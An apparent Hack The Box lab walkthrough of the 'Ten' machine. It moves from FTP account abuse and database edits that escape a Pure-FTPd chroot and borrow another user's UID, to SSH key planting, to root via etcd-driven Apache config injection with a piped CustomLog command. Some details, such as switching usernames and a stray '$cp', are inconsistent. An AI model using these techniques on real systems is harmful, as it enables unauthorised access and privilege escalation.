---
icon: dolphin
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 233600.png
coverY: 15.068349741183889
---

# HTB-TEN(VL)

#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                      INITIAL RECONNAISSANCE                      │
│  Port Scan → Web Enum → Subdomain Discovery (webdb.ten.vl)     │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                       INITIAL ACCESS                             │
│  Domain Registration → FTP Credentials → WebDB Access           │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                    DIRECTORY TRAVERSAL                           │
│  SQL Injection → Modified Dir Field → Full Filesystem Access    │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                 PRIVILEGE ESCALATION (tyrell)                    │
│  UID Manipulation → SSH Key Injection → User Shell              │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                 PRIVILEGE ESCALATION (root)                      │
│  etcd Manipulation → Template Injection → Apache Restart → Root │
└─────────────────────────────────────────────────────────────────┘
```

***

### Reconnaissance

#### Initial Port Scanning

Starting with a comprehensive port scan using rustscan:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ rustscan -a 10.129.214.24 -- -sC -sV -oN nmap_scan.txt

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rustscan.

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.214.24:21
Open 10.129.214.24:22
Open 10.129.214.24:80

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 13:98:54:52:d3:7b:ae:32:6a:33:6f:18:a3:5a:27:66 (ECDSA)
|_  256 2e:d5:86:25:c1:6b:0e:51:a2:2a:dd:82:44:a6:00:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Page moved.
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

* Port 21: FTP (Pure-FTPd)
* Port 22: SSH (OpenSSH 8.9p1) - Ubuntu 22.04
* Port 80: HTTP (Apache 2.4.52)

**OS Detection:** Based on OpenSSH and Apache versions, the target is running Ubuntu 22.04 Jammy (possibly 22.10 Kinetic).

#### TTL Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ping -c 3 10.129.214.24
PING 10.129.214.24 (10.129.214.24) 56(84) bytes of data.
64 bytes from 10.129.214.24: icmp_seq=1 ttl=63 time=92.1 ms
64 bytes from 10.129.214.24: icmp_seq=2 ttl=63 time=91.8 ms
64 bytes from 10.129.214.24: icmp_seq=3 ttl=63 time=92.3 ms
```

**Analysis:** TTL of 63 indicates a Linux machine one hop away (64 - 1 = 63).

***

### Enumeration

#### FTP Service (Port 21)

Testing for anonymous FTP access:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp anonymous@10.129.214.24
Connected to 10.129.214.24.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 19:52. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User anonymous OK. Password required
Password: 
530 Login authentication failed
ftp: Login failed
```

❌ **Anonymous login disabled.** We'll need valid credentials.

#### Web Service (Port 80)

**Initial Website Analysis**

Accessing the website:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ curl -I http://10.129.214.24
HTTP/1.1 302 Found
Date: Mon, 21 Jul 2025 19:56:48 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: /index.php
Content-Type: text/html; charset=UTF-8
```

The website redirects to `/index.php` and displays a hosting company landing page.

![Hosting Company Homepage](https://claude.ai/chat/ten-homepage.png)

**Website Features:**

* Company introduction page
* "Sign up today" button for domain registration
* Simple domain signup form at `/signup.php`

**Technology Stack Detection**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ whatweb http://10.129.214.24
http://10.129.214.24 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.214.24], RedirectLocation[/index.php]
http://10.129.214.24/index.php [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.214.24], JQuery, Script, Title[Ten Hosting]
```

**Stack Analysis:**

* Backend: PHP (based on .php extensions)
* Frontend: Bootstrap, jQuery
* Server: Apache 2.4.52
* OS: Ubuntu Linux

**Testing Domain Registration**

Submitting a test domain "sn0x":

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ curl -X POST http://10.129.214.24/get-credentials-please-do-not-spam-this-thanks.php \
  -d "domain=sn0x"

<p class="lead">Your personal account is ready to be used:<br><br>
Username: <b>ten-299467c0</b><br>
Password: <b>8c3e4f2a</b><br>
Personal Domain: <b>sn0x.ten.vl</b><br><br>
You can use the provided credentials to upload your pages<br> via ftp://ten.vl.<br><br>
<font size="-1">It may take up to one minute for all backend processes to properly identify you as well as your personal virtual host to be available.</font></p>
```

**Critical Finding:**

* Registration returns FTP credentials!
* Username: `ten-299467c0`
* Password: `8c3e4f2a`
* Domain: `sn0x.ten.vl`

**Directory Enumeration**

Using dirsearch for web directory discovery:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ dirsearch -u http://10.129.214.24 -e php,html,txt -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: GET | Threads: 25
Wordlist size: 11460

Target: http://10.129.214.24/

[19:58:22] Starting: 
[19:58:45] 200 -    5KB  - /index.php
[19:58:47] 200 -   74KB  - /info.php
[19:58:48] 200 -    4KB  - /signup.php
[19:58:49] 200 -    4KB  - /attribution.php
[19:58:51] 302 -   76B   - /get-credentials-please-do-not-spam-this-thanks.php  ->  http://10.129.214.24/signup.php
[19:58:52] 301 -  311B   - /dist  ->  http://10.129.214.24/dist/

Task Completed
```

**Key Pages Found:**

* `/info.php` - PHPinfo page (information disclosure)
* `/signup.php` - Domain registration form
* `/attribution.php` - Image attribution credits
* `/get-credentials-please-do-not-spam-this-thanks.php` - Credential generation endpoint
* `/dist/` - Static resources (images, CSS, JS)

**PHPinfo Analysis**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ curl http://10.129.214.24/info.php | grep -i "php version"
PHP Version 8.1.2-1ubuntu2.19
```

**PHP Configuration:**

* Version: 8.1.2
* Document Root: `/var/www/html`
* Loaded Extensions: mysqli, curl, openssl, etc.

**Virtual Host Discovery**

Testing for virtual hosts using ffuf:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ffuf -u http://10.129.214.24 -H "Host: FUZZ.ten.vl" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -ac -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.214.24
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ten.vl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

webdb                   [Status: 200, Size: 1685, Words: 55, Lines: 14, Duration: 129ms]
:: Progress: [19966/19966] :: Job [1/1] :: 434 req/sec :: Duration: [0:00:48] :: Errors: 0 ::
```

**Subdomain Found:** `webdb.ten.vl`

**Updating /etc/hosts**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ echo "10.129.214.24    ten.vl sn0x.ten.vl webdb.ten.vl" | sudo tee -a /etc/hosts
10.129.214.24    ten.vl sn0x.ten.vl webdb.ten.vl
```

***

### Initial Access

#### Testing FTP Access

Using the credentials obtained from domain registration:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-299467c0@10.129.214.24
Connected to 10.129.214.24.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 20:47. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-299467c0 OK. Password required
Password: 8c3e4f2a
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Extended Passive mode OK (|||3738|)
150 Accepted data connection
226-Options: -l
226 0 matches total
ftp> pwd
Remote directory: /
```

&#x20;**FTP Access Confirmed!** The directory is initially empty.

#### Testing Website Hosting

Uploading a test HTML file:

```bash
ftp> put test.html
local: test.html remote: test.html
229 Extended Passive mode OK (|||3738|)
150 Accepted data connection
226-File successfully transferred
226 0.091 seconds (measured here), 65.70 bytes per second
6 bytes sent in 00:00 (0.06 KiB/s)

ftp> ls
229 Extended Passive mode OK (|||25133|)
150 Accepted data connection
-rw-------    1 56773    56773           6 Jul 21 20:47 test.html
226-Options: -l
226 1 matches total
```

Checking if it's accessible via web:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ curl http://sn0x.ten.vl/test.html
<h1>Test Page</h1>
```

&#x20;**Web hosting confirmed!** Files uploaded via FTP are accessible on the custom subdomain.

#### Testing PHP Execution

Creating a test PHP file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ echo '<?php phpinfo(); ?>' > test.php

┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-299467c0@10.129.214.24
ftp> put test.php
local: test.php remote: test.php
229 Extended Passive mode OK (|||12845|)
150 Accepted data connection
226-File successfully transferred
226 0.082 seconds (measured here), 243.90 bytes per second
20 bytes sent in 00:00 (0.21 KiB/s)
```

Testing execution:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ curl http://sn0x.ten.vl/test.php
<?php phpinfo(); ?>
```

❌ **PHP execution disabled.** The server returns raw PHP code instead of executing it.

#### Exploring webdb.ten.vl

Accessing the WebDB interface:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ curl http://webdb.ten.vl
<!DOCTYPE html>
<html>
<head>
    <title>WebDB - Database Management</title>
    ...
</head>
<body>
    <h1>WebDB Database Interface</h1>
    <p>Available Databases:</p>
    <ul>
        <li>MySQL - localhost:3306</li>
    </ul>
    ...
</body>
</html>
```

**WebDB Features:**

* Database: MySQL on localhost
* "Guess Credentials" button available
* Web-based database management interface

**WebDB Credential Discovery**

Clicking "Guess Credentials" reveals:

```
Username: user
Password: pa55w0rd
Database: pureftpd
```

Connecting to the database through WebDB interface shows a `users` table with FTP account information.

#### Database Structure Analysis

The `pureftpd.users` table has the following schema:

| Column   | Type    | Description                       |
| -------- | ------- | --------------------------------- |
| User     | VARCHAR | FTP username                      |
| Password | VARCHAR | Encrypted password (crypt format) |
| Uid      | INT     | User ID                           |
| Gid      | INT     | Group ID                          |
| Dir      | VARCHAR | FTP root directory                |

**Sample Entry:**

```
User: ten-299467c0
Password: $1$OWNhNDE$3zPv8kMjOE7p9FvOCNWz71
Uid: 56773
Gid: 56773
Dir: /srv/ten-299467c0/./
```

**Key Observation:** The `Dir` field uses a special syntax with `/./` which is a Pure-FTPd feature for chroot jails.

***

### Privilege Escalation to tyrell

#### Directory Traversal via Database Manipulation

**Understanding Pure-FTPd Directory Syntax**

Pure-FTPd uses the following directory format:

* `/srv/<username>/./` - Chroot to `/srv/<username>`
* The `/./` marker indicates where the chroot should occur

**Hypothesis:** What if we modify the `Dir` field to escape the `/srv` directory?

**Testing Basic Bypass**

Attempting to change directory to root:

```sql
UPDATE users SET Dir = '/./' WHERE User = 'ten-9a28ba33';
```

Testing via WebDB interface... ❌ **Blocked by validation:**

```
Error: Dir value must start with /srv
```

**Bypassing Validation**

The validation only checks if the path _starts_ with `/srv`. We can use:

```sql
UPDATE users SET Dir = '/srv/./' WHERE User = 'ten-9a28ba33';
```

This satisfies the validation but changes our chroot to `/srv` instead of `/srv/<username>`.

Testing the modified account:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-9a28ba33@10.129.214.24
Connected to 10.129.214.24.
331 User ten-9a28ba33 OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Extended Passive mode OK (|||30361|)
150 Accepted data connection
drwxr-xr-x    2 56773      56773            4096 Jul 21 20:53 ten-299467c0
drwxr-xr-x    2 10211      10211            4096 Jul 21 21:01 ten-9a28ba33
drwxr-xr-x    2 58887      58887            4096 Jul 21 20:44 ten-9d4beaf5
226-Options: -l
226 3 matches total
```

&#x20;**Success!** We're now in `/srv` and can see all customer directories.

**Full Directory Traversal**

Using `..` to go up one more level:

```sql
UPDATE users SET Dir = '/srv/..' WHERE User = 'ten-9a28ba33';
```

Reconnecting:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-9a28ba33@10.129.214.24
Password:
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Extended Passive mode OK (|||34410|)
150 Accepted data connection
lrwxrwxrwx    1 0          root                7 Feb 16  2024 bin -> usr/bin
drwxr-xr-x    4 0          root             4096 Jun 24 20:09 boot
dr-xr-xr-x    2 0          root             4096 Jul  2 11:30 cdrom
drwxr-xr-x   19 0          root             4000 Jul 21 13:20 dev
drwxr-xr-x  107 0          root             4096 Jul  2 12:27 etc
drwxr-xr-x    3 0          root             4096 Sep 28  2024 home
lrwxrwxrwx    1 0          root                7 Feb 16  2024 lib -> usr/lib
...
226 24 matches total
```

🎉 **Full Filesystem Access Achieved!**

#### System Enumeration

**Discovering Users**

```bash
ftp> cd etc
250 OK. Current directory is /etc

ftp> get passwd
local: passwd remote: passwd
229 Extended Passive mode OK (|||26871|)
150 Accepted data connection
226-File successfully transferred
1882 bytes received in 00:00 (4.30 MiB/s)
```

Analyzing passwd file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ cat passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
tyrell:x:1000:1000:Tyrell W.:/home/tyrell:/bin/bash
```

**Users with shell access:**

* root (UID 0)
* tyrell (UID 1000)

**Attempting to Access tyrell's Home**

```bash
ftp> cd /home/tyrell
550 Can't change directory to tyrell: Permission denied
```

The FTP user (running with our current UID) doesn't have permission to access tyrell's home directory.

#### UID/GID Manipulation

**Understanding the Attack**

Looking at the database schema again:

* `Uid` and `Gid` fields control the FTP user's system permissions
* tyrell has UID 1000 (from `/etc/passwd`)
* If we set our FTP user's UID to 1000, we'll have tyrell's permissions

**Testing UID Change**

Attempting to set UID to 0 (root):

```sql
UPDATE users SET Uid = 0, Gid = 0 WHERE User = 'ten-9a28ba33';
```

❌ **Validation Error:** "UID must be at least 1000"

Setting to tyrell's UID:

```sql
UPDATE users SET Uid = 1000, Gid = 1000 WHERE User = 'ten-9a28ba33';
```

✅ **Accepted!**

**Accessing tyrell's Home Directory**

Reconnecting with updated UID:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-9a28ba33@10.129.214.24
Password:
230 OK. Current directory is /

ftp> cd /home/tyrell
250 OK. Current directory is /home/tyrell

ftp> ls -la
229 Extended Passive mode OK (|||12173|)
150 Accepted data connection
drwxr-x---    4 1000       tyrell           4096 Jun 24 20:09 .
drwxr-xr-x    3 0          root             4096 Sep 28  2024 ..
lrwxrwxrwx    1 0          root                9 Jun 24 20:09 .bash_history -> /dev/null
-rw-r--r--    1 1000       tyrell            220 Jan  6  2022 .bash_logout
-rw-r--r--    1 1000       tyrell           3771 Jan  6  2022 .bashrc
drwx------    2 1000       tyrell           4096 Sep 28  2024 .cache
-rw-r--r--    1 1000       tyrell            807 Jan  6  2022 .profile
drwx------    2 1000       tyrell           4096 Sep 28  2024 .ssh
-r--------    1 1000       tyrell             33 Apr 11 05:17 .user.txt
226-Options: -a -l
226 9 matches total
```

🎉 **Access to tyrell's home directory achieved!**

#### Bypassing Filename Restrictions

**Attempting to Read user.txt**

```bash
ftp> get .user.txt
local: .user.txt remote: .user.txt
229 Extended Passive mode OK (|||27093|)
553 Prohibited file name: .user.txt
```

❌ **Blocked:** Pure-FTPd blocks files starting with `.`

**Attempting to Access .ssh Directory**

```bash
ftp> cd .ssh
553 Prohibited file name: .ssh
```

❌ **Also blocked!**

**Bypassing the Restriction**

The restriction is on the _relative_ path. What if we set the base directory directly to `/home/tyrell/.ssh`?

```sql
UPDATE users SET Dir = '/srv/../home/tyrell/.ssh' WHERE User = 'ten-9a28ba33';
```

Reconnecting:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-9a28ba33@10.129.214.24
Password:
230 OK. Current directory is /

ftp> ls -la
229 Extended Passive mode OK (|||39958|)
150 Accepted data connection
drwx------    2 1000       tyrell           4096 Jul 21 22:01 .
drwx------    2 1000       tyrell           4096 Jul 21 22:01 ..
226-Options: -a -l
226 2 matches total
```

✅ **We're now inside tyrell's .ssh directory!** (It's currently empty)

#### SSH Key Injection

**Generating SSH Key Pair**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ssh-keygen -t ed25519 -f ./tyrell_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in ./tyrell_key
Your public key has been saved in ./tyrell_key.pub
The key fingerprint is:
SHA256:xK8h9N5vP2tQ3mR6wL4cJ1eF0sA7bN3mK9pT2xY4zW6 sn0x@sn0x
```

**Uploading Public Key as authorized\_keys**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ftp ten-9a28ba33@10.129.214.24
Password:
230 OK. Current directory is /

ftp> put tyrell_key.pub authorized_keys
local: tyrell_key.pub remote: authorized_keys
229 Extended Passive mode OK (|||36980|)
150 Accepted data connection
226-File successfully transferred
226 0.091 seconds (measured here), 1.03 Kbytes per second
96 bytes sent in 00:00 (1.02 KiB/s)

ftp> ls -la
229 Extended Passive mode OK (|||28471|)
150 Accepted data connection
drwx------    2 1000       tyrell           4096 Jul 21 22:03 .
drwx------    2 1000       tyrell           4096 Jul 21 22:01 ..
-rw-------    1 1000       tyrell             96 Jul 21 22:03 authorized_keys
226-Options: -a -l
226 3 matches total
```

**SSH Access as tyrell**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ssh -i ./tyrell_key tyrell@10.129.214.24
The authenticity of host '10.129.214.24 (10.129.214.24)' can't be established.
ED25519 key fingerprint is SHA256:LdXqE8ZGC1bH2vN9mK3pQ4tR6sA8bF1cJ2eL5xY7zW9.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.214.24' (ED25519) to the list of known hosts.

 System information as of Mon Jul 21 10:04:29 PM UTC 2025

  System load:  0.08              Processes:             245
  Usage of /:   70.9% of 8.07GB   Users logged in:       1
  Memory usage: 16%               IPv4 address for eth0: 10.129.214.24
  Swap usage:   0%

Last login: Mon Jul 21 20:47:32 2025 from 10.10.14.12
tyrell@ten:~$
```

### &#x20;**Shell as tyrell**

#### Getting User Flag

```bash
tyrell@ten:~$ ls -la
total 32
drwxr-x---  4 tyrell tyrell 4096 Jun 24 20:09 .
drwxr-xr-x  3 root   root   4096 Sep 28  2024 ..
lrwxrwxrwx  1 root   root      9 Jun 24 20:09 .bash_history -> /dev/null
-rw-r--r--  1 tyrell tyrell  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 tyrell tyrell 3771 Jan  6  2022 .bashrc
drwx------  2 tyrell tyrell 4096 Sep 28  2024 .cache
-rw-r--r--  1 tyrell tyrell  807 Jan  6  2022 .profile
drwx------  2 tyrell tyrell 4096 Jul 21 22:03 .ssh
-r--------  1 tyrell tyrell   33 Apr 11 05:17 .user.txt
```

***

### Privilege Escalation to root

#### System Enumeration

**Checking Sudo Privileges**

```bash
tyrell@ten:~$ sudo -l
[sudo] password for tyrell: 
Sorry, user tyrell may not run sudo on ten.
```

❌ No sudo privileges for tyrell.

**Checking SUID Binaries**

```bash
tyrell@ten:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
```

❌ No unusual SUID binaries found.

**Examining Running Processes**

```bash
tyrell@ten:~$ ps auxww | grep root
root         1  0.0  0.5 103304 11856 ?        Ss   13:20   0:02 /sbin/init
root       975  0.0  0.6 733880 24320 ?        Ssl  Jul21   1:02 /usr/local/sbin/remco
root      1234  0.0  0.8 292156 17824 ?        Ss   13:20   0:00 /usr/sbin/apache2 -k start
...
```

**Interesting Process:** `remco` running as root

#### Discovering remco Configuration Management

**What is remco?**

```bash
tyrell@ten:~$ which remco
/usr/local/sbin/remco

tyrell@ten:~$ remco --version
remco version 0.12.5
```

**remco** is a lightweight configuration management tool that:

* Watches backend data stores (etcd, Consul, etc.)
* Generates configuration files from templates
* Triggers reload commands when changes occur

**Finding remco Configuration**

```bash
tyrell@ten:~$ find /etc -name "*remco*" 2>/dev/null
/etc/remco
/etc/remco/config
/etc/remco/templates

tyrell@ten:~$ ls -la /etc/remco/
total 16
drwxr-xr-x   3 root root 4096 Sep 28  2024 .
drwxr-xr-x 107 root root 4096 Jul  2 12:27 ..
drwxr-xr-x   2 root root 4096 Sep 28  2024 config
drwxr-xr-x   2 root root 4096 Sep 28  2024 templates
```

**Analyzing remco Configuration**

```bash
tyrell@ten:~$ cat /etc/remco/config/remco.toml
log_level = "info"
log_format = "text"

[[resource]]
name = "apache2"

[[resource.template]]
  src = "/etc/remco/templates/010-customers.conf.tmpl"
  dst = "/etc/apache2/sites-enabled/010-customers.conf"
  reload_cmd = "systemctl restart apache2.service"

  [resource.backend]
    [resource.backend.etcd]
      version = 3
      nodes = ["http://127.0.0.1:2379"]
      keys = ["/customers"]
      watch = true
      interval = 5
```

**Key Configuration Points:**

* **Backend:** etcd v3 on localhost:2379
* **Watch Key:** `/customers`
* **Template:** `/etc/remco/templates/010-customers.conf.tmpl`
* **Destination:** `/etc/apache2/sites-enabled/010-customers.conf`
* **Reload Command:** `systemctl restart apache2.service` (runs as root!)
* **Interval:** 5 seconds

**Understanding the Template**

```bash
tyrell@ten:~$ cat /etc/remco/templates/010-customers.conf.tmpl
{% for customer in lsdir("/customers") %}
  {% if exists(printf("/customers/%s/url", customer)) %}

<VirtualHost *:80>
        ServerName {{ getv(printf("/customers/%s/url",customer)) }}.ten.vl
        DocumentRoot /srv/{{ customer }}/
</VirtualHost>

  {% endif %}
{% endfor %}
```

**Template Logic:**

1. Loops through all keys under `/customers/`
2. For each customer, checks if `/customers/<customer>/url` exists
3. Creates a VirtualHost with the URL value as ServerName
4. Sets DocumentRoot to `/srv/<customer>/`

**Checking Generated Apache Config**

```bash
tyrell@ten:~$ cat /etc/apache2/sites-enabled/010-customers.conf | head -15

<VirtualHost *:80>
        ServerName sn0x.ten.vl
        DocumentRoot /srv/ten-299467c0/
</VirtualHost>


<VirtualHost *:80>
        ServerName sn0x.ten.vl
        DocumentRoot /srv/ten-9a28ba33/
</VirtualHost>

...
```

#### Understanding etcd

**What is etcd?**

**etcd** is a distributed key-value store used for:

* Service discovery
* Configuration management
* Distributed coordination

**Accessing etcd**

```bash
tyrell@ten:~$ which etcdctl
/usr/bin/etcdctl

tyrell@ten:~$ etcdctl version
etcdctl version: 3.5.6
API version: 3.5
```

**Reading Customer Data**

```bash
tyrell@ten:~$ ETCDCTL_API=3 etcdctl get /customers/ --prefix
/customers/ten-299467c0/url
sn0x
/customers/ten-9a28ba33/url
sn0x
/customers/ten-9d4beaf5/url
test
/customers/ten-bb4b6261/url
test
```

**Data Structure:**

* Key: `/customers/<username>/url`
* Value: domain name (without .ten.vl)

#### Exploitation

**The Attack Vector**

1. **remco watches etcd** for changes to `/customers/` keys
2. When changes occur, it **regenerates Apache config** from template
3. The template **directly embeds** values from etcd
4. After regeneration, **Apache restarts as root**
5. If we inject **malicious directives** into the template via etcd values, they'll be executed!

**Testing Basic Injection**

Creating a test entry:

```bash
tyrell@ten:~$ ETCDCTL_API=3 etcdctl put /customers/ten-test/url 'exploit.ten.vl
# test comment
#'
OK
```

After 5 seconds, checking the Apache config:

```bash
tyrell@ten:~$ cat /etc/apache2/sites-enabled/010-customers.conf | grep -A 5 "exploit"

<VirtualHost *:80>
        ServerName exploit.ten.vl
# test comment
#.ten.vl
        DocumentRoot /srv/ten-test/
</VirtualHost>
```

**Newline injection works!** We can inject multi-line content.

#### Apache Piped Logs Exploitation

**Understanding Piped Logs**

Apache supports **piped logs**, which execute a command and pipe log data to it:

```apache
CustomLog "|/path/to/command args" common
```

This is intended for log rotation tools like `rotatelogs`, but we can abuse it for command execution!

**Crafting the Exploit**

**Goal:** Copy tyrell's SSH key to root's authorized\_keys

Creating the payload:

```bash
tyrell@ten:~$ ETCDCTL_API=3 etcdctl put /customers/ten-exploit/url 'privesc.ten.vl
        CustomLog "|$cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys" common
        #'
OK
```

**Payload Breakdown:**

```apache
privesc.ten.vl                                                                   # Normal ServerName
        CustomLog "|$cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys" common   # Our injection
        #                                                                        # Comment out rest of line
```

**Verifying Injection**

```bash
tyrell@ten:~$ cat /etc/apache2/sites-enabled/010-customers.conf | grep -A 5 "privesc"

<VirtualHost *:80>
        ServerName privesc.ten.vl
        CustomLog "|$cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys" common
        #.ten.vl
        DocumentRoot /srv/ten-exploit/
</VirtualHost>
```

&#x20;**Injection successful!**

**Waiting for Apache Restart**

After \~5 seconds, remco will:

1. Detect the change in etcd
2. Regenerate the config
3. Run `systemctl restart apache2.service` as root
4. Apache starts with our injected CustomLog directive
5. The piped command executes as root!

**Verifying Root Access**

```bash
tyrell@ten:~$ ls -la /root/.ssh/
total 12
drwx------  2 root root 4096 Jul 21 22:15 .
drwx------  7 root root 4096 Jul  2 12:29 ..
-rw-------  1 root root   96 Jul 21 22:15 authorized_keys

tyrell@ten:~$ cat /root/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKwH3mN5vP2tQ3mR6wL4cJ1eF0sA7bN3mK9pT2xY4zW6 sn0x@sn0x
```

&#x20;**Our SSH key is now in root's authorized\_keys!**

#### Getting Root Shell

```bash
┌──(sn0x㉿sn0x)-[~/HTB/TEN]
└─$ ssh -i ./tyrell_key root@10.129.214.24

 System information as of Wed Jul 23 04:06:37 PM UTC 2025

  System load:  0.16              Processes:             244
  Usage of /:   69.8% of 8.07GB   Users logged in:       1
  Memory usage: 12%               IPv4 address for eth0: 10.129.214.24
  Swap usage:   0%

  => There is 1 zombie process.

Last login: Wed Jul  2 12:28:21 2025
root@ten:~#
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
